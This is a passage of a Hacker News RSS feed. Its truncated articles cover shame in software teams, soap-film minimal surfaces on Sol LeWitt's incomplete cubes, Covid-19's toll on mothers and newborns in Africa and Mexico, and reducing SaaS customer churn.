us.</p><h2>Patterns and symptoms</h2><p>If you have read this far, you may have already found yourself feeling uncomfortable. One of the ironies of shame is that it can be shameful to name. Being near someone who is experiencing something shameful can be itself shameful for the rest of us. Shame is highly contagious. When someone on the huge Zoom call is not muted and we hear something we probably should not, we can all feel awkward. The symptoms are often the same for the witnesses and the ashamed. We avert our eyes. We look away. Cover our faces. When we feel shame we feel seen, so we want to escape and hide. Sink into the floor. Disappear.</p><p>Like <a href="https://en.wikipedia.org/wiki/First_inauguration_of_Franklin_D._Roosevelt#:~:text=So%2C%20first%20of%20all%2C%20let,to%20convert%20retreat%20into%20advance."><span>FDR’s famous speech about fearing fear itself</span></a>, being ashamed of shame is one of the ways it becomes such a powerful yet hidden motivator in our everyday interactions. Gershen Kaufman, in <a href="https://www.goodreads.com/book/show/1354467.Shame"><span>his essential book on shame</span></a>, coined the phrase “shame spiral” to describe the emotional pattern of a triggering event (the exposure of some inadequacy, real or perceived), the shame affect (the feeling), the shame response to that feeling, and then the awareness of the shame, which itself can be a trigger that creates more shame and so on. After repeated experiences, we can learn to shortcut emotionally from the trigger to the response, very quickly.</p><p>Shame triggers and responses are enculturated, shaped by age, gender, race, class and identities of all kinds. <a href="https://en.wikipedia.org/wiki/Impostor_syndrome"><span>Imposter Syndrome</span></a> (very common in the digital technology world, where knowledge (the ideal self) evolves so quickly) is a phenomenon rooted in shame. How we experience shame and what we do about it are filtered through language and the stories we tell ourselves about ourselves. Events that are seen as shameful in one context may not be in another. But the shame affect itself is universal and <a href="https://en.wikipedia.org/wiki/Shame#Identification"><span>not limited to humans</span></a>, and there are some consistent patterns in how humans respond to shame.</p><p>We often use the word “toxic” to describe people or environments where shame has been weaponized to enforce patterns of power and privilege. You may know or have encountered people who are very good at making other people feel very bad. We use phrases like “hanging them out to dry” or “throwing them under the bus” or “cutting them off at the knees” or “gaslighting” – all violent images that refer to using shame to deflect responsibility, cast blame, or assert power. People who use shame as a weapon may often have highly attuned internalized shame patterns themselves. They may even, at least superficially, seem immune to shaming. The culture of the organization itself can become infused with weaponized, contagious shame. It’s as if there is blame brewed in the office coffee.</p><p>How do we know if we’re in the presence of shame? Obviously we can’t always see when someone is feeling shame, since it’s a profoundly internal experience. Still, there are some clues we can pay attention to. When I observe, in myself or others, the following emotions or behaviors, I often smell shame lurking behind them. While many of these are <a href="https://en.wikipedia.org/wiki/Affect_theory#Silvan_Tomkins.27s_nine_affects"><span>primary affects</span></a> (biological emotions), they tend to be secondary responses to shame. In other words, we feel exposed first and then as we come unstuck we slide into one or more of these other affects.</p><h3>Blame</h3><p>Blame is essentially pointing away and saying “don’t look at me, look over there instead.” The classic and probably the most common shame response, blame is most visible within organizations and teams, but that does not mean it is always spoken aloud. Sometimes the most hurtful blame is cast only in our internal narratives. Scapegoating is literally the ritual of placing the blame on a goat and sending it away from the community. Blame creates distance (sometimes physical, always …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://truss.works/blog/shame-and-software">https://truss.works/blog/shame-and-software</a></em></p>]]>
            </description>
            <link>https://truss.works/blog/shame-and-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544445</guid>
            <pubDate>Mon, 21 Sep 2020 15:19:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sol LeWitt and the Soapy Pit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544365">thread link</a>) | @hardmath123
<br/>
September 21, 2020 | https://hardmath123.github.io/minimal-surface.html | <a href="https://web.archive.org/web/*/https://hardmath123.github.io/minimal-surface.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="postcontent">
            <section>
                
                <center><em><p>Rendering minimal surfaces of cubical loops</p>
</em></center>
                <h4>Sunday, September 13, 2020 · 3 min read</h4>
<p>A 2014 <a href="https://www.math.ksu.edu/~rozhkovs/LeWitt_cubes.pdf">paper</a> by
Rozhkovskaya and Reb titled “Is the List of Incomplete Open Cubes Complete?”
complicates Sol LeWitt’s celebrated 1974 artwork, “Incomplete Open Cubes”. The
artwork is a <a href="https://www.metmuseum.org/art/collection/search/691091">gallery</a>
of 122 three-dimensional structures; they are meant to be all distinct
connected subsets of edges of the unit cube that result in a 3D figure — or,
in LeWitt’s words, “all the ways of the cube not being complete”. The
complication, noted by the paper, is that two of the structures are identical
up to rotation; they should instead be mirror reflections of each other.</p>
<p>Have art historians realized yet? I would like to think there is some deeper
philosophical significance to this bit of trivia. The exercise in exhaustive
enumeration of incompleteness is itself incomplete — and, we cannot help but
overlook the incompleteness, just as we cannot help but imagine the missing
edges of any of the 122 almost-cubes.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/incomplete-open-cubes.png" alt="Incomplete Open Cubes"></p>
<blockquote>
<p>Image source: <a href="https://cubes-revisited.art/">Incomplete Open Cubes Revisited</a></p>
</blockquote>
<p>I have <a href="https://hardmath123.github.io/eucalyptus.html">meditated on the art-historical significance of chirality
before</a>, so today I want to talk about something else. I don’t
know about you, but when I see LeWitt’s almost-cubes, I feel the need to
submerge them in a tank of soapy water. Why? To see what shape the films take,
of course! Is that irrational? Perhaps, but <a href="https://www.moma.org/collection/works/146945">writes
LeWitt</a>, “Irrational thoughts
should be followed absolutely and logically.” It turns out that my thought
isn’t hard to follow — if not absolutely and logically, then at least
computationally.</p>
<p>The shape of a soap film is a <a href="https://en.wikipedia.org/wiki/Minimal_surface">minimal
surface</a>, that is, the surface
with minimal area that obeys the boundary conditions of the “loop” that the
film forms within. The definition doesn’t depend at all on the properties of
soap: any film-forming substance should — in the absence of other forces,
such as gravity — contract to the same shape as a result of surface tension.
These shapes can often be pleasing and unexpected.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/helicoid.png" alt="Soap film on a spring"></p>
<blockquote>
<p>Image source: <a href="https://commons.wikimedia.org/wiki/File:Bulle_de_savon_h%C3%A9lico%C3%AFde.PNG">Wikipedia</a></p>
</blockquote>
<p>Now, because finding the surface is a question of continuous minimization, we
should be able to easily apply automatic differentiation — at least, to a
discretization of the problem.  Here is the algorithm: we start with a mesh
grid of points and triangulate it. Then, we compute the surface area by
repeated application of Heron’s Theorem to the triangles. Finally, we
differentiate the total area with respect to the positions of the points, and
nudge the points towards less area. The full source code for this adventure is
available <a href="https://hardmath123.github.io/static/minimal-surface/minimal-surface.ipynb">here</a>. (By the way,
I’m using PyTorch out of habit, but perhaps TensorFlow would be more
appropriate because of its oddly LeWittian logo.)</p>
<hr>
<p>Before I give you the results, I want you to take a moment to try and imagine
what the soap films will look like. I think it’s an interesting exercise in
qualitative reasoning, and, in any case, LeWitt’s work all but pleads for us to
see what isn’t there.</p>
<p>For starters, we can reduce the entire problem from 122 cubes into just a
handful of cases. Simply ask: how many distinct-up-to-symmetry “loops” are
there on a cube?  Let’s do casework by face count: there is 1 loop with one
face (the “square”), 1 loop with two faces (the “L”), and 2 loops with three
faces (the “U” and the “corner”). The rest are accounted for by complement: a
four-face loop is also a two-face loop.</p>
<p>This yields a total of 4 cases — much more manageable! And indeed, I’ll
suggest that you start with Case 1, the “square”, since the answer in that case
should be obvious.</p>
<hr>
<p>Okay, now, the results!</p>
<p>Case 1 is easy; we already know the answer. The soap film is just flat, because
its boundary is planar.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/case_1.gif" alt="Case 1, the square"></p>
<p>Case 2 is less obvious — I would not have predicted this outcome! It turns
out that the soap film tries to “flatten” itself into the hypotenuse. What are
the implications of this? Well, one implication is that if you want to minimize
the material you use to build a tent (without regard to volume), you can do
better than stretching the material taught into large rectangles. Sagging
actually <em>saves</em> material.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/case_2.gif" alt="Case 2, the &quot;L&quot;"></p>
<p>You might expect Case 3a to flatten similarly, but because of the up-down
symmetry that can’t happen. Instead, you get a beautiful saddle shape.
Actually, it turns out that all minimal surfaces are saddle-like; if they had
nonzero curvature at some point then you should be able to “flatten the bulge”
to reduce surface area.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/case_3a.gif" alt="Case 3a, the &quot;U&quot;"></p>
<p>And finally, Case 3b — sorry this isn’t quite perfectly modeled — tries to
flatten itself around the center, kind of like a tortilla chip.</p>
<p><img src="https://hardmath123.github.io/static/minimal-surface/case_3b.gif" alt="Case 3b, the &quot;corner&quot;"></p>

            </section>

            

        </article></div>]]>
            </description>
            <link>https://hardmath123.github.io/minimal-surface.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544365</guid>
            <pubDate>Mon, 21 Sep 2020 15:12:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Childbirth in the Pandemic How Covid-19 Is Indirectly Killing Mothers and Babies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544340">thread link</a>) | @htnsao
<br/>
September 21, 2020 | https://www.spiegel.de/international/tomorrow/childbirth-in-the-pandemic-how-covid-19-is-indirectly-killing-mothers-and-babies-a-adf7c1f1-441b-4aa3-87bd-86e9f3345b0b | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/tomorrow/childbirth-in-the-pandemic-how-covid-19-is-indirectly-killing-mothers-and-babies-a-adf7c1f1-441b-4aa3-87bd-86e9f3345b0b">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;ac90f8da-4dd8-4ef9-acf8-2a662211263d&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;845c629d-fbb0-47b8-a1a3-c8bb2291ea04&quot;}">
<p><span>
<span data-image-el="aspect">
<span>
<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/ac90f8da-4dd8-4ef9-acf8-2a662211263d_w948_r1.77_fpx54_fpy41.jpg" srcset="https://cdn.prod.www.spiegel.de/images/ac90f8da-4dd8-4ef9-acf8-2a662211263d_w520_r1.77_fpx54_fpy41.jpg 520w, https://cdn.prod.www.spiegel.de/images/ac90f8da-4dd8-4ef9-acf8-2a662211263d_w948_r1.77_fpx54_fpy41.jpg 948w" width="948" height="536" sizes="948px" title="Midwife Emily Owino cuts the umbilical cord of a newborn girl with a razor blade in Kenya." alt="Midwife Emily Owino cuts the umbilical cord of a newborn girl with a razor blade in Kenya.">
</span>
</span>
</span>

</p>
<figcaption>
<p>Midwife Emily Owino cuts the umbilical cord of a newborn girl with a razor blade in Kenya.</p>
<span>
Foto: <p>Brian Inganga/ AP</p>
</span>
</figcaption>
</figure>
</div><div>

<section data-area="contentbox">
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;2fa44351-36df-4f69-a199-2381a05127a2&quot;, &quot;zoomable&quot;:false,&quot;zoomId&quot;:&quot;99dec484-2e14-4b39-8f85-c27a3a7470fa&quot;}">
<span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w568_r1_fpx50.98_fpy45.png" srcset="https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w284_r1_fpx50.98_fpy45.png 284w, https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w335_r1_fpx50.98_fpy45.png 335w, https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w568_r1_fpx50.98_fpy45.png 568w" width="568" height="568" sizes="568px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w284_r1_fpx50.98_fpy45.png 284w, https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w335_r1_fpx50.98_fpy45.png 335w, https://cdn.prod.www.spiegel.de/images/2fa44351-36df-4f69-a199-2381a05127a2_w568_r1_fpx50.98_fpy45.png 568w">
</span>
</span>
</span>
</figure>
<p>For our Global Societies project, reporters around the world will be writing about societal problems, sustainability and development in Asia, Africa, Latin America and Europe. The series will include features, analyses, photo essays, videos and podcasts looking behind the curtain of globalization. The project is generously funded by the Bill &amp; Melinda Gates Foundation.</p>
<p><a href="https://www.spiegel.de/thema/global_societies_en/" target="_blank" title="All Articles">
<span>
<span>All Articles</span>
<span><svg aria-labelledby="title-c574a7a6-2399-4cda-b8c2-4a59cf32f997" width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg" role="img"><title id="title-c574a7a6-2399-4cda-b8c2-4a59cf32f997">Pfeil nach rechts</title><g id="s-chevron-right-f-c574a7a6-2399-4cda-b8c2-4a59cf32f997"><g id="s-chevron-right-c574a7a6-2399-4cda-b8c2-4a59cf32f997"><path id="vector-c574a7a6-2399-4cda-b8c2-4a59cf32f997" d="M4.333 2.667L7.667 6 4.333 9.333" stroke-width="1.5" stroke-linecap="round"></path></g></g></svg>
</span>
</span>
</a>
</p></div>
</section>
<p>It's shortly before midnight on May 29 when Brian Inganga gets the call. "You have to hurry," the midwife tells him. The 31-year-old photographer immediately jumps on a motorcycle taxi and heads to Kibera, a slum in Nairobi, the capital city of Kenya. Inganga is anxious, not only because the slum is "dark and dangerous," as he puts it, but because it's after curfew and "the police are extremely aggressive at night."</p>


<div>
<p>The midwife picks him up on a street corner and leads him through the narrow alleyways to her small shack. On the floor of a tiny room inside lies Veronica Atieno, 23. Her contractions are strong.</p><p>In the hours that follow, Inganga takes photos as the mother gives birth to her daughter, Shaniz Joy Juma. There are no doctors or medical supplies present, just a wooden spoon for the mother to bite on and an herbal mixture from the midwife for the pain. "It was a shocking experience," says the photographer over the phone, as he relates the story behind the photos. "Our women can't go to the hospital to give birth. They lie on the filthy ground and are deeply afraid."</p>
</div>

<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;833fadd0-2ab0-4661-aa2a-7190d5b6f61e&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;be8e1742-df69-4035-ae00-315120d2a6bd&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w920_r1.5_fpx44_fpy52.jpg" srcset="https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w520_r1.5_fpx44_fpy52.jpg 520w, https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w782_r1.5_fpx44_fpy52.jpg 782w, https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w920_r1.5_fpx44_fpy52.jpg 920w" width="920" height="613" sizes="920px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w520_r1.5_fpx44_fpy52.jpg 520w, https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w782_r1.5_fpx44_fpy52.jpg 782w, https://cdn.prod.www.spiegel.de/images/833fadd0-2ab0-4661-aa2a-7190d5b6f61e_w920_r1.5_fpx44_fpy52.jpg 920w" title="The birth lasted several hours. Veronica Atieno bites down on a wooden spoon in order to better tolerate the pain." alt="The birth lasted several hours. Veronica Atieno bites down on a wooden spoon in order to better tolerate the pain.">
</span>
</span>
</span>
</p><figcaption>
<p>The birth lasted several hours. Veronica Atieno bites down on a wooden spoon in order to better tolerate the pain.</p>
<span>
Foto: <p>Brian Inganga/ AP</p>
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>Brian Inganga wanted to document such a birth because he is worried. He grew up in Kibera himself and knows what it means to live in a slum. "Poverty and danger," he says. "And now, everything has become even more difficult. The corona crisis is a threat to women. Many have become pregnant against their will because it is almost possible to find contraception, or they were abused at a young age. And women giving birth face great dangers and have no one to turn to."</p><p>Even before the pandemic, Kenya had one of the highest maternal mortality rates in the world. Although there is hardly any data available yet for 2020, experts and aid organizations believe that the number of women and babies who die during or shortly after birth has risen significantly - not just in Kenya, but around the world.</p>
</div>

<p>A <a target="_blank" rel="noopener noreferrer" href="https://www.thelancet.com/journals/langlo/article/PIIS2214-109X(20)30229-1/fulltext" data-link-flag="external">study </a>by Johns Hopkins University, based on mathematical modeling for 118 countries, forecast a worst-case scenario with the additional deaths of 1 million infants and 56,700 mothers in 2020 because of the pandemic. "It is currently difficult to get precise numbers," says Rebekka Frick, a 43-year-old health expert with Save the Children. "The true effect of the pandemic on the mortality rates of mothers and infants will only become clear in a few years."</p>
<div>

<div>
<p>"We are more than concerned. That is in part due to reports that we have received from countries like Kenya and Bangladesh, but also due to our knowledge of developments that other epidemics have triggered."</p>
<p>Rebekka Frick, Save the Children</p>
</div>

</div>
<p>In the<a target="_blank" rel="noopener noreferrer" href="https://www.thelancet.com/journals/langlo/article/PIIS2214-109X(20)30345-4/fulltext#seccestitle10" data-link-flag="external"> first published study</a> on the influence of the lockdown on births, an international team of scientists analyzed data from nine hospitals in Nepal. They found that the country's lockdown led to a reduction of hospital births of almost 50 percent. Stillbirths and infant deaths rose over the same period by roughly the same amount.</p>

<div>
<p>Similar numbers are expected for many other countries. "We are more than concerned," says Frick. "That is in part due to reports that we have received from countries like Kenya and Bangladesh, but also due to our knowledge of developments that other epidemics have triggered."</p><h3>Seven Dead Infants in a Single Night</h3><p>In some countries in Africa, medical professionals are already sounding the alarm. In Central Hospital, located in the Zimbabwean capital of Harare, seven babies died during childbirth on a single night in late July. A doctor <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/DMagombeyi/status/1290401445188112385" data-link-flag="external">tweeted a photo</a> of the infants, lined up next to each other and wrapped in cloth.</p><p>Doctors in South Africa<a target="_blank" rel="noopener noreferrer" href="https://www.bbc.com/news/world-africa-53396057" data-link-flag="external"> told the BBC </a>that the maternity ward in the Dora Nginza Hospital in Port Elizabeth is completely overwhelmed. "Several mothers and infants have died" and hospital personnel are "deeply traumatized."</p><p>In both countries, the deaths were partly blamed on severe staff shortages. The majority of health-care workers must focus on treating COVID-19 patients or have been infected themselves. Others are on strike out of fear for their health - due to shortages of protective equipment like masks and gloves. Disinfectant and medicines are also in short supply due to delivery problems. Pregnant women are often forced to wait for days for urgent operations and they frequently cannot be helped in emergency situations or during birth.</p>
</div>
<section>

</section>
<div>
<p>"The consequences of the pandemic are catastrophic," says Emma Ingaiza, 32, who works for an NGO called <a target="_blank" rel="noopener noreferrer" href="https://www.shofco.org/" data-link-flag="external">Shining Hope for Communities</a> in Kenya. She has been working almost constantly since the beginning of the corona crisis, helping people in need, including many pregnant women.</p><p>Ingaiza has also read reports recently about the unusual number of stillbirths and mothers dying during birth. "Everyone is panicked due to the coronavirus," she says. "All protective measures and almost all remaining medical personnel are focused on COVID-19. Pregnant women, mothers and babies are suffering as a result."</p><p>In Kenya, she says, some medical facilities where up to 30 children were born every night prior to the coronavirus pandemic have had to close due to a shortage of personnel. Women whose contractions begin in the evening, she says, are afraid to leave their homes due to the brutality with which the police have been enforcing the coronavirus curfew, which has been in place since mid-March. Several people have been beaten by the police, she says, because they were outdoors at night. "Including a man who wanted to drive his pregnant wife to the hospital," says Brian Inganga. "That kind of thing gets around quickly."</p>
</div>
<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;6ef00019-19b5-484a-9593-35638eac2f9e&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;7d093e25-26cb-4a7c-a19d-0c692a60ccac&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w920_r1.4997202014549524_fpx65.3_fpy49.98.jpg" srcset="https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w520_r1.4997202014549524_fpx65.3_fpy49.98.jpg 520w, https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w782_r1.4997202014549524_fpx65.3_fpy49.98.jpg 782w, https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w920_r1.4997202014549524_fpx65.3_fpy49.98.jpg 920w" width="920" height="613" sizes="920px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w520_r1.4997202014549524_fpx65.3_fpy49.98.jpg 520w, https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w782_r1.4997202014549524_fpx65.3_fpy49.98.jpg 782w, https://cdn.prod.www.spiegel.de/images/6ef00019-19b5-484a-9593-35638eac2f9e_w920_r1.4997202014549524_fpx65.3_fpy49.98.jpg 920w" title="A baby shortly after a home birth in Mexico City on May 25. Mexico reports a heightened rate of maternal mortality since the spread of the coronavirus." alt="A baby shortly after a home birth in Mexico City on May 25. Mexico reports a heightened rate of maternal mortality since the spread of the coronavirus.">
</span>
</span>
</span>
</p><figcaption>
<p>A baby shortly after a home birth in Mexico City on May 25. Mexico reports a heightened rate of maternal mortality since the spread of the coronavirus.</p>
<span>
Foto: Gustavo Graf Maldonado&nbsp;/ REUTERS
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>In many cases, this has meant home births, with a midwife present in the best-case scenario. But midwives have also had trouble keeping up with demand of late. "Sometimes, they are trying to care for three women with strong contractions, but only have a single pair of gloves," says Inganga, the photographer, who has been in close contact with several midwives in Nairobi for weeks. "What are they supposed to do then?"</p><p>Midwives in Germany and other wealthy countries have noticed that the limits on social contact and the resulting forced inactivity during the pandemic have been good for many mothers-to-be. One <a target="_blank" rel="noopener noreferrer" href="https://www.medrxiv.org/content/10.1101/2020.05.22.20109793v1" data-link-flag="external">study</a> found that the drop in premature births and other complications is linked to, among other things, lower stress levels.</p><p>But in many other countries around the world -- particularly in poorer ones, where there was a shortage of life-saving medical care for mothers and infants even before the coronavirus pandemic -- there are concerns about rising maternal and infant mortality rates. The World Health Organization (WHO) defines maternal mortality as a situation when a mother dies during pregnancy or up to 42 days after giving birth. Infant mortality refers to deaths during the first 28 days of life.</p><p>For many aid organizations and scientists, numbers from comparable, past epidemics are important indicators for where we stand now. The West African office of the United Nations Population Fund (UNFPA) has issued guidelines based on the lessons learned from the epidemics seen since 2003. During the Ebola epidemic, for example, which wreaked havoc in Guinea, Sierra Leone and Liberia from 2013 to 2016, constraints on medical care led to an alarming rise in maternal mortality.</p><p>UNFPA is thus recommending that the new COVID-19 crisis teams established in many countries increase their focus on women's health issues.</p><h3><strong>Mothers and Babies Contract the Virus in Hospitals</strong></h3><p>An additional problem is ensuring that the health checkups that generally take place before and after birth actually happen. "In many countries, women are no longer coming to the hospitals because they are afraid of corona," says Rebekka Frick of Save the Children. "They hear that many people are dying there, and they want to protect themselves and their babies."</p><p>Hilda Argüello Avendaño, a doctor with Observatorio de Mortalidad Materna, an NGO monitoring maternal mortality, says that in Mexico, too, this fear has led pregnant women with complications to only seek hospital care as a last resort. Eight children, including <a target="_blank" rel="noopener noreferrer" href="https://www.jornada.com.mx/2020/08/12/estados/027n1est" data-link-flag="external">four newborns</a>, recently got infected with the coronavirus in a hospital in Oaxaca.</p><p>"In Mexico, the pandemic has become the primary cause of maternal death," says Avendaño. Compared to the same period last year, she says, the death rate of mothers has risen by more than 25 percent. By the beginning of August, there were 97 cases of women infected with the coronavirus dying during pregnancy or shortly after giving birth.</p>
</div>
<figure>
<div data-component="Image" data-settings="{&quot;id&quot;:&quot;07c6722b-9630-4b37-a271-24f69aad47ed&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;4702e541-f8e5-489e-996c-d15bf113015e&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w920_r1.5_fpx52_fpy46.jpg" srcset="https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w520_r1.5_fpx52_fpy46.jpg 520w, https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w782_r1.5_fpx52_fpy46.jpg 782w, https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w920_r1.5_fpx52_fpy46.jpg 920w" width="920" height="613" sizes="920px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w520_r1.5_fpx52_fpy46.jpg 520w, https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w782_r1.5_fpx52_fpy46.jpg 782w, https://cdn.prod.www.spiegel.de/images/07c6722b-9630-4b37-a271-24f69aad47ed_w920_r1.5_fpx52_fpy46.jpg 920w" title="In late May, 24-year-old Karla Lopez Rangel gives birth with the help of a midwife and her husband." alt="In late May, 24-year-old Karla Lopez Rangel gives birth with the help of a midwife and her husband.">
</span>
</span>
</span>
</p><figcaption>
<p>In late May, 24-year-old Karla Lopez Rangel gives birth with the help of a midwife and her husband.</p>
<span>
Foto: <p>Gustavo Graf Maldonado&nbsp;/ REUTERS</p>
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>In around half of those deaths, existing conditions like obesity, diabetes or high blood pressure played a role. The pandemic, though, has revealed social inequalities in the country: Mothers-to-be who do not have insurance and are forced to rely on free state health care face an especially high risk of dying, say doctors, in part because they receive worse care or because care comes too late.</p><p>The decision to forego a visit to the …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/tomorrow/childbirth-in-the-pandemic-how-covid-19-is-indirectly-killing-mothers-and-babies-a-adf7c1f1-441b-4aa3-87bd-86e9f3345b0b">https://www.spiegel.de/international/tomorrow/childbirth-in-the-pandemic-how-covid-19-is-indirectly-killing-mothers-and-babies-a-adf7c1f1-441b-4aa3-87bd-86e9f3345b0b</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/tomorrow/childbirth-in-the-pandemic-how-covid-19-is-indirectly-killing-mothers-and-babies-a-adf7c1f1-441b-4aa3-87bd-86e9f3345b0b</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544340</guid>
            <pubDate>Mon, 21 Sep 2020 15:09:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Back to basics: easy guide to avoid SaaS churn]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544259">thread link</a>) | @pau_alcala
<br/>
September 21, 2020 | https://blog.palabra.io/reduce-churn-saas | <a href="https://web.archive.org/web/*/https://blog.palabra.io/reduce-churn-saas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><em>By Abril Taker - Content creator at <a href="https://www.palabra.io/?utm_medium=reduce-churn-saas&amp;utm_source=blog">Palabra</a></em>.</p><p>If you’re wondering why, despite all your efforts, your customers are still dropping off your products, then you need to continue reading this article. That, my dear friend, has a name and it’s churn rate. We’re gonna tell you what this means and how you can avoid it for your SaaS business by sharing a few easy strategies that worked for us in <a href="https://www.palabra.io/?utm_medium=reduce-churn-saas&amp;utm_source=blog">Palabra</a>.</p><h2>What's customer churn rate?</h2><p>Let’s start with the basics: the easiest definition for churn we found is in this <a href="https://blog.hubspot.com/service/what-is-customer-churn">Hubspot</a> article, they just say churn is:</p><blockquote><p><em>People who have cut ties with your company</em>.</p></blockquote><p>It is also known as customer attrition.</p><p>So, we can understand the <strong>churn rate</strong> as</p><blockquote><p><em>A metric that measures the percentage of customers who no longer interact with your business. This may be because they unsuscribed or because they haven’t opened one of your emails in a year or more</em>.</p></blockquote><p>The churn rate is one of the most valuable metrics when applying a customer retention strategy. It allows you to measure if your business vision is having a positive impact on your clients and gives you important feedback to improve.</p><p>As you know, as a member of a SaaS company, subscriptions are one of the most valuable assets. So, customer churn is something that you want to avoid at all cost.</p><p><strong>Here is a universal truth</strong>: It’s less expensive to keep customers than to gain new ones.</p><p>It’s impossible to achieve churn zero. People are constantly changing, and that includes their purchases. Also not all users are gonna like your service for a lot of different reasons, and that’s ok. But it’s important that you try your best to reduce churn and even predict it.</p><h2>Calculate customer churn rate</h2><p>In order to understand what is going on, you have to calculate your customer churn rate.</p><p>The formula to obtain the magic number is quite easy: take the number of customers who churned and divide it for the total of new customers, then multiply the result by 100%.</p><blockquote><p><strong>For example</strong> 1️⃣0️⃣➗1️⃣0️⃣0️⃣ = 0️⃣,1️⃣0️⃣✖️ 1️⃣0️⃣0️⃣% = 1️⃣0️⃣</p></blockquote><p>The churn rate is calculated over a specific period of time. It’s key to study what’s the best criteria for your company. You can calculate it over a period of a year, monthly or even to ten years, it’s up to you.</p><p>Your minimum goal should be that your churn rate is never higher than your new customers rate. It's like sailing a boat: you always want to keep it "over" the water.</p><h2>How customer churn can affect your business</h2><p>An unexpected increase in the churn rate can mean many things. High churn rate can impact your business in a variety of ways:</p><p>📉 <strong>Wrong strategy</strong>: it doesn't necessarily mean a wrong marketing strategy. It could be that one of your products doesn’t match with user expectations. It could be a lack of performance in the customer service area.</p><p>📉 <strong>Revenue loss</strong>: no clients, no money. As simple as that.</p><p>📉 <strong>Stronger competitors</strong>: If a client isn’t in your nest, she’s in another.</p><p>📉 <strong>It</strong> <strong>can hurt your public image</strong> and translate into more revenue loss. Your investors will not be pleased with this picture.</p><p>Keep in mind that long-term customers bring in a big piece of your revenue. So you have to nurture those relationships.</p><h2>How to avoid customer churn</h2><p>Now the section that you probably were waiting for. The answer to this problem that afflicts us all. In <a 